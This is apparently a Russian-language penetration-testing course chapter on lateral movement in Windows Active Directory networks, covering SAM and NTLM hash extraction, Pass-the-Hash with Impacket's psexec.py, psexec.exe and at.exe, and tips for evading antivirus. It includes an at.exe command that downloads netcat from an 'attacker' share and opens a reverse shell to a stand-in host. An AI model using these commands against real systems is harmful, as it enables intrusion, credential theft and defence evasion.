### Горизонтальное (“боковое”) перемещение

На этом этапе мы можем воспользоваться наработками, полученными в ходе этапа повышения привилегий, и переиспользовать их
в других машинах сети. Давайте обсудим, как это устроено, и почему это работает в сетях с Windows машинами под
управлением Active Directory.

Боковое перемещение — это одновременное сочетание 2 техник:

- Извлечение секретной информации после получения доступа
- Аутентифицированное удаленное выполнения кода

Цикличное, последовательное повторение этих шагов порой позволяет от одного‑единственного взломанного ПК дойти до полной
компрометации всей сетевой инфраструктуры.

### Локальные учетные записи и NT(LM)-хеши

Мы уже знакомы с извлечением хешей паролей из файла SAM. Давайте разберемся в них немного поподробнее, чтобы
впоследствии лучше представлять себе работу с ними.

Локальные пользователи вместе с NTLM-хешами хранятся в реестре по пути HKLM\sam.

Сам по себе SAM (Security Account Manager) — это отдельный куст реестра, который лежит в \windows\system32\config наряду
с другими кустами.

Примечательно, что даже администратор (за исключением system) не может получить доступ к HKLM\sam с помощью regedit.exe
или напрямую скопировав файл из системной директории. Однако команда reg.exe позволяет сделать это.

Очень важно, что на практике мы будем извлекать системные файлы с помощью встроенных компонентов ОС, а анализировать их
уже на нашей системе. Тем самым мы абсолютно точно не вызовем антивирусной тревоги.

Где и как хранятся хеши паролей?

Windows до версии Vista по умолчанию хранила пароль в двух разных хэшах — LM и NT. В Vista и выше LM-хэш не хранится.
Для начала посмотрим, где искать эти хэши, а потом разберемся, что из себя они представляют.

Пароли пользователей, а также много другой полезной информации хранится в реестре по адресу
HKLM\SAM\SAM\Domains\Account\users\[RID]\V, известном как V-блок.

Раздел SAM находится в соответствующем файле С:\Windows\System32\config\SAM.

В Windows 2000 и выше оба полученных хэша дополнительно шифруются алгоритмом RC4 с помощью ключа, известного как
«системный ключ», или bootkey, сгенерированного утилитой syskey, и шифруются довольно хитрым образом.

Получить из реестра хэши можно с правами локального админа, например, используя уже знакомый нам meterpreter и его
команду hashdump.

В результате получаем хеши в формате Username:RID:LM-hash:NTLM-hash:::.

В новых системах (начиная с Windows 7/2008R2) LM-хеш может быть пустым, то есть иметь значение
aad3b435b51404eeaad3b435b51404ee, так как LM-хеши больше не используются по соображениям безопасности. Пустой пароль
NTLM-хеша, в свою очередь, — это 31d6cfe0d16ae931b73c59d7e0c089c0.

Во время бокового перемещения, когда хешей очень много, такие хеши надо обнаруживать сразу и отбрасывать, так как
ограничение пустого пароля не позволит выполнить удаленный вход.

Пример извлеченного хеша:

> admin:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

И LM-, и NTLM-хеши могут быть также найдены и для доменных пользователей при анализе памяти lsass.exe или в базе
ntds.dit.

Они никогда не передаются по сети как есть, вместо этого они транслируются в виде NetNTLM/NetNTLMv2-хешей, которые
непригодны для атаки Pass-the-Hash.

* Данные типы хешей одноразовые и могут быть использованы только в момент передачи (техника NTLM-relay).

### Pass the Hash

Pass the Hash (PtH) — это метод аутентификации пользователя без доступа к его паролю в открытом виде. Метод заключается
в обходе стандартных этапов аутентификации, на которых требуется ввод пароля, и переходе непосредственно к той части
аутентификации, которая использует хэш пароля.

Все извлеченные NTLM-хеши (отличные от 31d6cfe0d16ae931b73c59d7e0c089c0) могут использоваться для аутентификации на
следующих типах сервисов:

    MSRPC (SMB)
    DCERPC (WMI)
    WINRM
    MS SQL
    RDP (только Windows 2012 R2 и Windows 8.1)
    LDAP
    IMAP
    HTTP

Но выполнять код мы можем, как правило, только на первых пяти сервисах из списка, для последних трех более применимы
атаки NTLM-relay.

Как осуществить атаку PtH?

Для осуществления атаки Pass the Hash в Windows 7 и выше с установленным обновлением KB2871997 требуются действительные
учетные данные пользователя домена или хэши администратора (RID 500).

psexec.py -hashes
> aad3b435b51404eeaad3b435b51404ee:cdf51b162460b7d5bc898f493751a0cc
> example.local/Administrator@10.129.177.234 whoami

**Psexec.py** — один из скриптов из набора скриптов Impacket, отвечающий за выполнение команды в Windows системах в
соответствии с тем как работает утилита psexec.

**Impacket** — это набор классов Python для работы с сетевыми протоколами. Impacket ориентирован на предоставление
низкоуровневого программного доступа к пакетам, а для некоторых протоколов (например, SMB1-3 и MSRPC) — к самой
реализации протокола. Пакеты могут быть созданы с нуля, а также разобраны из необработанных данных, а
объектно-ориентированный API упрощает работу с глубокими иерархиями протоколов. Библиотека предоставляет набор
инструментов в качестве примеров того, что может быть сделано в контексте этой библиотеки.

### Выполнение кода на узле с учетной записью

Удаленное исполнение кода на узле может выполняться различными способами. Рассмотрим несколько утилит, которые позволят
нам удобно работать с выполнением кода на удаленных машинах в будущем.

**Psexec.exe**

Начиная говорить об удаленном исполнении кода в Windows, нельзя не упомянуть небезызвестный psexec от Марка Руссиновича.

    Происхождение: sysinternals
    Риск детектирования антивирусом: отсутствует
    Используемые порты: 135, 445, 4915x/TCP

Данная программа пользуется одинаковой популярностью и у администраторов, и у пентестеров. Принцип ее работы заключается
в копировании исполняемого файла через сетевой ресурс «ADMIN$» (445/TCP) с последующим удаленным созданием и запуском
службы для этого исполняемого файла через DCERPC (135,4915x/TCP).

Psexec работает следующим образом:

    Монтируется к «шаре» и производит запись сервиса
    Создает сервис через удаленный sc.exe
    Стартует с удаленного сервиса
    Psexec останавливает сервис
    Удаляет сервис
    Удаляет бинарный файл

После запуска службы происходит обычное сетевое взаимодействие с удаленной командной строкой:

> psexec.exe -u admin \\target cmd

Главный плюс для нас в том, что серверный компонент psexecsvc.exe подписан сертификатом Sysinternals (который
принадлежит Microsoft), и, следовательно, это стопроцентно легитимная программа. Также к явным достоинствам
классического psexec.exe относится способность выполнять код в указанных пользовательских сеансах:

> psexec.exe -u admin -i 2 \\target shutdown /l

**Impacket**

Impacket — это набор классов Python для работы с сетевыми протоколами. Impacket ориентирован на обеспечение
низкоуровневого программного доступа к пакетам, а для некоторых протоколов (например, SMB1-3 и MSRPC) — на саму
реализацию протокола. Пакеты могут быть созданы с нуля, а также проанализированы на основе необработанных данных, а
объектно-ориентированный API упрощает работу с глубокими иерархиями протоколов.
Библиотека предоставляет набор инструментов в качестве примеров того, что можно сделать в контексте этой библиотеки.

**Psexec.py**

    Происхождение: Python-пакет impacket
    Риск детектирования антивирусом: есть
    Используемые порты: 445/TCP

Отличная альтернатива для пользователей Linux, однако этот инструмент почти наверняка поднимет антивирусную тревогу. Как
было сказано, все дело в службе, которая копируется на удаленный хост.

Это можно исправить, указав в реализации метода createService() в
/usr/local/lib/python3.7/dist-packages/impacket/examples/serviceinstall.py произвольную команду, которая будет выполнена
вместо запускаемой службы удаленного администрирования.

Чтобы psexec.py не скопировал заметный антивирусу компонент, указываем принудительно, какой файл использовать в качестве
службы. И, поскольы уже вручную прописали команду, этим файлом может быть что угодно:

psexec.py -file somefile.txt admin@target

Таким образом, мы напрямую выполнили команду, что, конечно же, не вызовет реакции со стороны антивирусов. Однако
подобная модификация psexec лишает нас того удобства использования, которое было изначально.

**Atexec.py / at.exe**

    Происхождение: Python-пакет impacket / встроенный компонент Windows
    Риск детектирования антивирусом: отсутствует
    Используемые порты: 445/TCP

Служба планировщика заданий Windows, доступная через smb-пайп atsvc. Позволяет удаленно поместить в планировщик задачу,
которая выполнится в указанный момент.

> DCE/RPC — удаленный шедулер, работает на Windows Vista и выше. В обоих случаях это не интерактивное средство
> удаленного исполнения кода. При использовании at.exe происходит слепое исполнение команд:

> at.exe \\target 13:37 "cmd /c copy \\attacker\a\nc.exe && nc -e \windows\system32\cmd.exe attacker 8888"

А вот для atexec.py команда выполнится с результатом: atexec.py admin@target ipconfig

Вся разница в том, что результат выполнения команды будет направлен в файл и прочитан через сетевой ресурс ADMIN$.
Для своей работы инструмент требует, чтобы часы у attacker и target были настроены на одно время — с точностью до
минуты.

### Выводы

- Машины Windows имеют очень большую поверхность атаки при попытках повышения привилегий в них, т.к. системы имеют
  большое
  наследие, пристальное внимание сообщества к их безопасности и по умолчанию разрешают слишком многое.
- Также машины Windows при работе в сети зачастую настраиваются унифицировано, используют одинаковые учетные записи и
  предоставляют протоколы удаленной аутентификации для различных случаев администрирования.

### Материалы для самостоятельного изучения

Рекомендуемые ресурсы

Безопасность аутентификации в Windows и AD
Hacktrics
Стандарт по тестированию на проникновение PTES


Active Directory:

Чеклист по тестированию защищенности Active Directory
Эксплуатация Zerologon
Эксплуатация уязвимостей в AD CS
Microsoft Windows Technical Documents
Active Directory Security
https://blog.harmj0y.net/
hackndo
https://dirkjanm.io/
Steve on Security
Lab of a Penetration Tester
ired.team


Помимо блогов, предлагаем вам подборку отличных инструментов, ориентированных на Active Directory, которые не только
полезны, но и могут позволить вам изучить множество механизмов и протоколов Active Directory, просмотрев их код (это
далеко не исчерпывающий список, и многие другие перечислены и показаны в статье выше).

mimikatz:  вероятно, самый известный инструмент для атаки на Windows и Active Directory. Он реализует на C все виды атак
для получения учетных данных с компьютеров Windows и выдачи себя за пользователей в Active Directory.


impacket: Impacket реализует многие из протоколов на python, и стоит знать, как это работает, чтобы узнать о них больше.
Он также включает в себя множество примеров, реализующих атаки, описанные в статье.


responder.py: Responder позволяет вам выполнять множество PitM-атак, злоупотребляя протоколами разрешения Windows и
предоставляя вам множество серверов протоколов, которые будут собирать NTLM-хэши. Стоит знать, как это работает.


Rubeus: Rubeus – это пакет C# для выполнения атак Kerberos с компьютеров под управлением Windows. Вы можете проверить
это, чтобы узнать много нового о том, как работает Kerberos.


CrackMapExec: CME – это инструмент на python, который позволяет вам простым способом выполнять множество различных атак,
описанных здесь.


BloodHound: BloodHound позволяет вам сопоставлять сеть Active Directory с множеством различных запросов LDAP и другими.
Вам следует проверить это, если вы хотите узнать о разведке Active Directory.


Powerview: инструмент Powershell, который реализует множество LDAP-запросов Active Directory и других протоколов для
извлечения всех видов информации из Active Directory.


Empire: набор для развертывания агентов на компьютерах Active Directory, который позволяет выполнять все виды атак.
Содержит множество инструментов для выполнения разведки и атак через Active Directory, которые стоит проверить.